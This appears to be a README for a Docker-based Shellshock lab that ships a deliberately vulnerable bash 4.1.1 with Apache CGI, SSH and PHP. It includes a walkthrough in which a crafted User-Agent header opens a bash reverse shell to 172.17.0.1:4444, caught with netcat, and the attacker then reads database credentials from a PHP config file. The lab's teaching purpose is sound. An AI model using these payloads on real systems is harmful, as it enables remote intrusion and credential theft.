# shellshock-lab

This is a playground to investigate and emulate the infamous `shellshock` vulnerability in `bash` (CVE-2014-6271, CVE-2014-7169, CVE-2014-7186 CVE-2014-7186, ...).

## About Shellshock

`https://en.wikipedia.org/wiki/Shellshock_(software_bug)`

Shellshock is a critical vulnerability discovered in older versions of the Bash shell. It allows attackers to execute arbitrary commands by injecting malicious code into specially crafted environment variables. The vulnerability occurs during the initialization of a new Bash process,
where Bash improperly processes function definitions within environment variables.

```bash
env x='() { :;}; echo vulnerable!' bash -c ""
```

In vulnerable Bash versions, the above command will echo "vulnerable!" because Bash misinterprets additional code after the function definition.

### CVE identifiers

- CVE-2014-6271 (initial),
- CVE-2014-6277,
- CVE-2014-6278,
- CVE-2014-7169,
- CVE-2014-7186,
- CVE-2014-7187

### Key impacts

- Shellshock is dangerous because environment variables can be passed to Bash from external sources, such as web servers (via CGI scripts), SSH, or other services.
- Attackers can use this to compromise systems and execute arbitrary commands.

## Repo Content

- `README.md` contains the description and instructions
- `image/` - contains everything that is needed to build a vulnerable, unpatched image of bash (`4.1.1`)

## Image

The docker image builds upon tianon's excellent `docker-bash` [build code](https://github.com/tianon/docker-bash). We've removed backports, added certain runtime dependencies (`openssh`,`apache2`, `php`, `python`, ...) and added various config file for those services (`httpd.conf`, `sshd_config`, cgi scripts, ...).

Our goal was to create an easy-to-use, AIO image as a playground for various shellshock shenanigans.

The image is also published on DockerHub under `docker.io/ninnit/shellshock-lab:latest`.

### Building

From within the image directory...

```bash
docker build -t shellshock-lab:latest .
```

### Running

```bash
docker run --rm -p 2222:22 -p 8080:80 -p 8443:443 -it docker.io/ninnit/shellshock-lab:latest
```

## Examplatory Attack

The container runs an httpd webserver, which exposes a CGI script, as well as a simple PHP app.

The container can be started using...

```bash
docker run --rm -p 2222:22 -p 8080:80 -p 8443:443 -it docker.io/ninnit/shellshock-lab:latest
```

The interesting URLs are:

- `http://localhost:8080/cgi-bin/submit-comment.cgi` -> 200 -> vulnerable CGI bash script
- `http://localhost:8080/myapp/index.php` -> 200 -> PHP App `index.php`
- `http://localhost:8080/myapp/config.php` -> 403 -> PHP App config file. Access to this file is not possible directly from the webb

Our goal is to read the content of the php config file, as it may contain sensible database credentials.

Do do this, we can exploit the `shellshock` vulnerability, by sending a malicious `User-Agent` header to the CGI endpoint. `apache2` evaluates the Header as an Environment-Variable - and executes our code (as the webserver's user -> `apache`).

We'd like to have a reverse-shell, so in our case we'll design the header like this:

```text
() { :; }; /bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1
o
```

It creates a interactive bash session, redirects it's stdout/stderr to a tcp socket, and redirects the stdin (from our reverse shell) back to the session.

We'll create a `netcat` listener on our host machine, to catch the reverse-shell on port `4444`:

```bash
nc --listen --verbose --local-port 4444
```

Here's the `curl` HTTP request:

```bash
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1" http://localhost:8080/cgi-bin/submit-comment.cgi
```

Once the request is sent, our reverse-shell is active:

```text
❯ nc --listen --verbose --local-port 4444
Connection from 172.17.0.2:54774
```

We can then read the content of the `config.php` file:

```text
cat /var/www/localhost/htdocs/myapp/config.php

<?php
// Sensitive configuration data
$db_user = "admin";
$db_pass = "verysecure123";
?>
bash-4.1
```
